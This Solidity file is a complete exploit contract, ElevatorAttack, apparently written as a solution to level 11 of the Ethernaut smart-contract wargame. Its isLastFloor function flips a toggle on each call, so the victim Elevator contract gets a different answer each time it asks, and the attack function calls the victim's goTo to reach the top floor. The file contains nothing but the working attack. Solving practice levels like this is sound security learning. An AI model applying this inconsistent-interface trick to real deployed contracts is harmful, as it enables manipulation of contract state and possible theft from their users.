// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernautContracts/11_Elevator.sol";


contract ElevatorAttack {

    bool public toogleState = true;
    bool public top;

    Elevator public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = Elevator(_victimContractAddr);
    }

    function isLastFloor (uint) public returns(bool) {
        toogleState = !toogleState;
        return toogleState;
    }

    function attack(uint _floor) public {
        victimContract.goTo(_floor);
    }

}